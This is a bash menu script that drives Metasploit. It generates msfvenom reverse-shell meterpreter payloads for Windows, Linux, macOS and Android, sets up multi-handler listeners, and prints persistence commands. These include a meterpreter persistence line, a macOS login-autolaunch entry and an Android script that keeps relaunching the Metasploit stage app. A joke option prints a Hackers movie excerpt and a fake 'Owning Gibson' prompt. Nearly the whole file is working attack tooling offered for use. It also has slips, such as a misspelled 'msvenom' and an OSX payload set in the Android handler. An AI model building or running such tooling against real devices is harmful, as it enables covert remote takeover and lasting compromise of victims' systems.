#!/bin/bash
[[ `id -u` -eq 0 ]] || { echo -e "Must be root to run script"; exit 1; }
#resize -s 30 60                                   
SERVICE=service;
if ps ax | grep -v grep | grep metasploit > /dev/null
then
    echo "$SERVICE service running"
else
    echo "$SERVICE is not running, Starting service." 
    sudo service metasploit start
fi 
mkdir ~/Desktop/temp 
echo -e "SELECT AN OPTION"
echo -e "1. Create Payload"
echo -e "2. Start a multi handler"
echo -e "3. Exploit"
echo -e "4. Forge a Persistence script"
echo -e "5. Armitage"
echo -e "6. Kage"
read options
case "$options" in
  "1" | "1" )
PS3='Enter your choice 6=QUIT: '
options=("win" "nix" "mac" "droid" "listall" "exit")
select opt in "${options[@]}"
do
    case $opt in
        "win")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f exe > ~/Desktop/temp/shell.exe
            echo -e "\E[1;33m::::: \e[97mshell.exe saved to ~/Desktop/temp\E[1;33m:::::"
            ;;
        "nix")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f elf > ~/Desktop/temp/shell.elf
            echo -e "\E[1;33m::::: \e[97mshell.elf saved to ~/Desktop/temp\E[1;33m:::::"
            ;;
        "mac")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p osx/x86/shell_reverse_tcp LHOST=$uservar LPORT=$userport -f macho > ~/Desktop/temp/shell.macho
            echo -e "\E[1;33m::::: \e[97mshell.macho saved to ~/Desktop/temp\E[1;33m:::::"
            ;;
        "droid")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p android/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport R > ~/Desktop/temp/shell.apk
            echo -e "\E[1;33m::::: \e[97mshell.apk saved to ~/Desktop/temp\E[1;33m:::::"
            ;;  
        "listall")
            xterm -e msvenom -l &
            ;;   
        "exit")
            echo "Good Bye" && break
            ;;
        *) echo invalid option;;
    esac
done
 ;;

  "2" | "2" )
echo -e "LISTNER"
PS3='Enter your choice 6=QUIT: '
options=("win" "mac" "nix" "droid" "listall" "exit")
select opt in "${options[@]}"
do
    case $opt in
        "win")
            touch ~/Desktop/temp/meterpreter.rc
            echo use exploit/multi/handler > ~/Desktop/temp/meterpreter.rc
            echo set PAYLOAD windows/meterpreter/reverse_tcp >> ~/Desktop/temp/meterpreter.rc
            read -p 'Set LHOST IP: ' uservar
            echo set LHOST $uservar >> ~/Desktop/temp/meterpreter.rc
            read -p 'Set LPORT: ' uservar
            echo set LPORT $uservar >> ~/Desktop/temp/meterpreter.rc
            echo set ExitOnSession false >> ~/Desktop/temp/meterpreter.rc
            echo exploit -j -z >> ~/Desktop/temp/meterpreter.rc
            cat ~/Desktop/temp/meterpreter.rc
            xterm -e msfconsole -r ~/Desktop/temp/meterpreter.rc &
            ;;
        "nix")
            touch ~/Desktop/temp/meterpreter_linux.rc
            echo use exploit/multi/handler > ~/Desktop/temp/meterpreter_linux.rc
            echo set PAYLOAD linux/x86/meterpreter/reverse_tcp >> ~/Desktop/temp/meterpreter_linux.rc
            read -p 'Set LHOST IP: ' uservar
            echo set LHOST $uservar >> ~/Desktop/temp/meterpreter_linux.rc
            read -p 'Set LPORT: ' uservar
            echo set LPORT $uservar >> ~/Desktop/temp/meterpreter_linux.rc
            echo set ExitOnSession false >> ~/Desktop/temp/meterpreter_linux.rc
            echo exploit -j -z >> ~/Desktop/temp/meterpreter_linux.rc
            cat ~/Desktop/temp/meterpreter_linux.rc
            xterm -e msfconsole -r ~/Desktop/temp/meterpreter_linux.rc &
            exit
            ;;
        "mac")
            touch ~/Desktop/temp/meterpreter_mac.rc
            echo use exploit/multi/handler > ~/Desktop/temp/meterpreter_mac.rc
            echo set PAYLOAD osx/x86/shell_reverse_tcp >> ~/Desktop/temp/meterpreter_mac.rc
            read -p 'Set LHOST IP: ' uservar
            echo set LHOST $uservar >> ~/Desktop/temp/meterpreter_mac.rc
            read -p 'Set LPORT: ' uservar
            echo set LPORT $uservar >> ~/Desktop/temp/meterpreter_mac.rc
            echo set ExitOnSession false >> ~/Desktop/temp/meterpreter_mac.rc
            echo exploit -j -z >> ~/Desktop/temp/meterpreter_mac.rc
            cat ~/Desktop/temp/meterpreter_mac.rc
            xterm -e msfconsole -r ~/Desktop/temp/meterpreter_mac.rc &
            ;;
        "droid")
            touch ~/Desktop/temp/meterpreter_droid.rc
            echo use exploit/multi/handler > ~/Desktop/temp/meterpreter_droid.rc
            echo set PAYLOAD osx/x86/shell_reverse_tcp >> ~/Desktop/temp/meterpreter_droid.rc
            read -p 'Set LHOST IP: ' uservar
            echo set LHOST $uservar >> ~/Desktop/temp/meterpreter_droid.rc
            read -p 'Set LPORT: ' uservar
            echo set LPORT $uservar >> ~/Desktop/temp/meterpreter_droid.rc
            echo set ExitOnSession false >> ~/Desktop/temp/meterpreter_droid.rc
            echo exploit -j -z >> ~/Desktop/temp/meterpreter_droid.rc
            cat ~/Desktop/temp/meterpreter_droid.rc
            xterm -e msfconsole -r ~/Desktop/temp/meterpreter_droid.rc &
            ;;  
        "listall")
            touch ~/Desktop/temp/payloads.rc
            echo show payloads > ~/Desktop/temp/payloads.rc
            cat ~/Desktop/temp/payloads.rc
            xterm -e msfconsole -r ~/Desktop/temp/payloads.rc &
            ;;   
        "exit")
            echo "Good Bye" && break
            ;;
        *) echo invalid option;;
    esac
done
;;

 "3" | "3" )
  # Accept upper or lowercase input.
  echo -e "Starting Metasploit"
  msfconsole
  use exploit/multi/handler  

;;


  "4" | "4" )
  # 
  echo -e "Persistence Generator"
 PS3='Enter your choice 5=QUIT: '
 options=("win" "nix" "mac" "droid" "exit")
 select opt in "${options[@]}"
 do
    case $opt in
        "win")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            echo -e "\E[1;33m::::: \e[97mrun persistence -U -X 30 -p $userport -r $uservar\E[1;33m:::::"
            ;;
        "nix")
            echo -e "\E[1;33m::::: \e[97mGet creative here :)\E[1;33m:::::"
            ;;
        "mac")
            echo 'Using directory /Applications/Utilities/'
            read -p 'Enter payload file name :example *shell.macho: ' uservar; 
            echo -e "\E[1;33m::::: \e[97mdefaults write /Library/Preferences/loginwindow AutoLaunchedApplicationDictionary -array-add ‘{Path=”/Applications/Utilities/$uservar”;}’\E[1;33m:::::"
            ;;
        "droid")
            touch ~/Desktop/temp/android.sh
            echo \#\!/bin/bash >> ~/Desktop/temp/android.sh
            echo while : >> ~/Desktop/temp/android.sh
            echo do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity >> ~/Desktop/temp/android.sh
            echo sleep 20 >> ~/Desktop/temp/android.sh
            echo done >> ~/Desktop/temp/android.sh
            cat ~/Desktop/temp/android.sh
            echo -e "\E[1;33m::::: \e[97mandroid.sh saved to ~/Desktop/temp. Upload to / on device\E[1;33m:::::" 
            ;;  
        "exit")
            echo "Good Bye" && break
            ;;
        *) echo invalid option;;
    esac
done
;;

  "5" | "5" )
  # 
  echo -e "Armitage Launcher"
  echo "armitage should be in /opt/armitage"
  echo -e "Launching..."
  xterm -e sudo java -jar /opt/armitage/armitage.jar & 

;;

 "x" | "x" )
clear
echo        We have a Zero Bug attacking all the login and
echo        overlay files.
echo                                PLAGUE
echo        Run anti-virus. Give me a systems display!
echo
echo        The systems display comes up. Red flashes everywhere,
echo        signifying new attacks. Plague presses a key.
echo
echo                                PLAGUE
echo        Die, dickweeds!
echo
echo                                HAL
echo        The rabbit is in the administration system.
echo
echo        Rabbit icons start to fill the systems display.
echo
echo                                PLAGUE
echo        Send a Flu-shot.
echo
echo                                MARGO
echo        Rabbit, Flu-shot, someone talk to me.
echo
echo                                HAL
echo        A rabbit replicates till it overloads a file,
echo        then it spreads like cancer.
echo -e "\e[31m[Owning Gibson / Please wait...\e[31m]"
echo -ne '#####                     (33%)\r'
sleep 3
echo -ne '#############             (66%)\r'
sleep 3
echo -ne '#######################   (100%)\r'
echo -ne '\n'
echo Stager sent! Starting session.. ....
echo root@Gibson~#


;;

          * )
   # Default option.      
   # 
   echo
   echo "Not yet in database."
  ;;

esac

tput sgr0                               # Reset colors to "normal."

echo

exit 0
